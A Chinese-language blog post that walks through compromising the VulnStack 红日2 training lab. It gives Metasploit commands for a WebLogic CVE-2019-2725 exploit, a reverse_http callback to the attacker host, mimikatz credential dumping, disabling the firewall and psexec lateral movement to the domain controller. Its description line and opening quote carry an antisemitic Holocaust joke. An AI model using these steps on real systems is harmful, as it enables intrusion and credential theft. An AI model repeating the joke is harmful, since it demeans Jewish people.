@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>VulnStack-红日2 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="犹太人怎么上天堂, well done">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack-红日2">
+<meta property="og:url" content="https://4reexile.github.io/article/vulnstack-2/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="犹太人怎么上天堂, well done">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-05-03T09:48:26.000Z">
+<meta property="article:modified_time" content="2024-07-05T11:06:23.697Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="cs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/vulnstack-2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'VulnStack-红日2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-05 19:06:23'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">VulnStack-红日2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-05-03T09:48:26.000Z" title="Created 2024-05-03 17:48:26">2024-05-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-05T11:06:23.697Z" title="Updated 2024-07-05 19:06:23">2024-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>well done也有全熟的意思</p>
+</blockquote>
+<h1>vulnstack红队2</h1>
+<p><strong>拍快照,拍快照,拍快照!</strong>不然你做不出来想要remake都做不到</p>
+<p>新增两个虚拟网络:
+192.168.111.0/24 外网环境(Vmnet1)
+10.10.10.0/24 内网环境(Vmnet2)</p>
+<blockquote>
+<p>靶机初始密码均为<code>1qaz@WSX</code></p>
+<p>管理员账号密码为<code>Administrator/1qaz@WSX</code></p>
+<p>当win7可以ping通所有ip地址, 环境就配置完成了</p>
+</blockquote>
+<ul>
+<li>
+<p>kali</p>
+<p>192.168.111.128</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://PC.de1ay.com">PC.de1ay.com</a></p>
+<p>用<code>DE1AY\mssql/1qaz@WSX</code>登录</p>
+<p>192.168.111.201</p>
+<p>10.10.10.201</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://DC.de1ay.com">DC.de1ay.com</a></p>
+<p>用<code>DE1AY\de1ay/1qaz@WSX</code>登录</p>
+<p>10.10.10.10</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://WEB.de1ay.com">WEB.de1ay.com</a></p>
+<p>这里因为域不同所以需要切换用户用<code>de1ay/1qaz@WSX</code>登录
+192.168.111.80
+10.10.10.80</p>
+</li>
+</ul>
+<p>右键以管理员身份运行<code>C:\Oracle\Middleware\user_projects\domains\base_domain</code>下的bat文件, 然后访问<code>ip:7001/console</code>让其自动部署即可启动好环境,刷新一下就能到后台登录界面,问就是没有其他网页</p>
+<p>这个360让我先试试水,在PC.de1ay.com上也有360,都打开</p>
+<blockquote>
+<p>好像开了360就不能被ping通了,现在pc和web相互无法ping通</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503082902329.png" alt="image-20240503082902329"></p>
+<h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2>
+<h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.111.0/24	// 主机发现</span><br><span class="line">nmap -sS 192.168.111.80		// 半开放扫描扫描目标端口</span><br><span class="line">nmap -sS -Pn 192.168.111.80		// 也可以用绕过防火墙的参数</span><br></pre></td></tr></table></figure>
+<p>可以看到两台主机: 201和80, 201扫描之后没有什么东西(都开了远程桌面和445端口?)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503102344954.png" alt="image-20240503102344954"></p>
+<p>7001: weblogic有着对应的扫描器, <a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan">下载地址</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 WeblogicScan.py -u 192.168.111.80 -p 7001</span><br></pre></td></tr></table></figure>
+<p>有两个漏洞,我们用最新的看能不能不触发360的防护</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503110448745.png" alt="image-20240503110448745"></p>
+<h3 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h3>
+<p>启动msf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search cve-2019-2725</span><br><span class="line">use 0</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set target 1</span><br><span class="line">set lport 10000</span><br><span class="line">set rhosts 192.168.111.80</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503151954640.png" alt="image-20240503151954640"></p>
+<p>由于360的存在,提权不太可能如此顺利,先进入shell进行信息收集</p>
+<h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2>
+<h3 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami          // de1ay\administrator</span><br><span class="line">ipconfig /all	// 域de1ay.com, 内网地址10.10.10.80, 外网地址192.168.111.80</span><br><span class="line">net user /domain	// 无回显</span><br><span class="line">net user		// Administrator, de1ay, Guest</span><br><span class="line">net config workstation 		// 计算机详细信息</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503155126019.png" alt="image-20240503155126019"></p>
+<p>利用ping寻找域控, <code>10.10.10.10</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163035435.png" alt="image-20240503163035435"></p>
+<h3 id="msf和cs联动"><a class="header-anchor" href="#msf和cs联动">¶</a>msf和cs联动</h3>
+<p><strong>msf-&gt;cs</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.111.128 123456		// 启动js</span><br></pre></td></tr></table></figure>
+<p>设置监听器如下, HTTP地址和端口随意设置, 要求和前面不能占用同一个端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503153330777.png" alt="image-20240503153330777"></p>
+<p>在msf中执行如下, 成功的话就可以看见一个新的会话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 1234</span><br><span class="line">set session 1	// 此处session是漏洞利用后连上win7的会话</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>会话交互,先输入<code>sleep 1</code>后立刻输入<code>shell whoami</code>等待回显, 有回显证明会话有效</p>
+<p>可以直接提权:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503162727794.png" alt="image-20240503162727794"></p>
+<p>利用<code>mimikatz</code>抓密码,然后就可以在<strong>密码凭据</strong>界面看到抓到的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logonpasswords	// 抓明文</span><br><span class="line">hashdump	// 抓hash</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163658011.png" alt="image-20240503163658011"></p>
+<p>尝试关闭防火墙, 成功, 但是似乎执行<code>net view</code>还是不可用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+<h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3>
+<p>和红队1相同,先创建smb监听器, 我直接就叫smb</p>
+<p>我的是中文版,是右键会话选择<code>新建会话(S)</code>就可以绑定smb监听器,还是交互输入<code>spawn smb</code>好</p>
+<p>我现在右键的这个是执行命令后多出来的&quot;跳板&quot;</p>
+<blockquote>
+<p>SMB Beacon使用windows管道进行通信,可以把以此为枢纽,进行内外网的流量转发</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503164211635.png" alt="image-20240503164211635"></p>
+<p>我这里攻击列表并没有出现域控或是其他主机, 我只能根据之前的信息进行手动添加</p>
+<p><code>视图(V)--&gt;目标列表(T)--&gt;下方的添加</code>, ip就直接是域控就好了<code>10.10.10.10</code></p>
+<p>先进行端口扫描,发现开放的端口中有135,139,445,尝试<code>psexec</code>登录域控, smb是之前新建的监听器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173030495.png" alt="image-20240503173030495"></p>
+<p>登录成功,我们取得了DC的控制权,而且权限为system</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173308230.png" alt="image-20240503173308230"></p>
+<p>对于另一个域成员只需要故技重施即可,虽然只知道外网地址,但是可以通过输入<code>arp -a</code>来看还有哪些主机,我这里在域控上输入:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173628952.png" alt="image-20240503173628952"></p>
+<p>轻易得到另一台主机是<code>10.10.10.201</code>,其他不再赘述</p>
+<blockquote>
+<p>此外可以做的拓展: ms14-068的域内提权</p>
+<p>诶话说回来, 360似乎没有啥截拦啊</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/vulnstack-2/">https://4reexile.github.io/article/vulnstack-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/msf/">msf</a><a class="post-meta__tags" href="/tags/Kali/">Kali</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/cs/">cs</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/vulnstack-3/" title="vulnstack-红日3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">vulnstack-红日3</div></div></a></div><div class="next-post pull-right"><a href="/article/vulnstack-1/" title="VulnStack-红日1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">VulnStack-红日1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/vulnstack-1/" title="VulnStack-红日1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-02</div><div class="title">VulnStack-红日1</div></div></a></div><div><a href="/article/vulnstack-5/" title="VulnStack-红日5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-27</div><div class="title">VulnStack-红日5</div></div></a></div><div><a href="/article/vulnstack-3/" title="vulnstack-红日3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-05</div><div class="title">vulnstack-红日3</div></div></a></div><div><a href="/article/lateral-movement/" title="横向移动"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-25</div><div class="title">横向移动</div></div></a></div><div><a href="/article/test-target-machine/" title="渗透测试靶机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">渗透测试靶机</div></div></a></div><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">vulnstack红队2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.1.</span> <span class="toc-text">外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-v2"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%92%8Ccs%E8%81%94%E5%8A%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">msf和cs联动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">横向移动</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
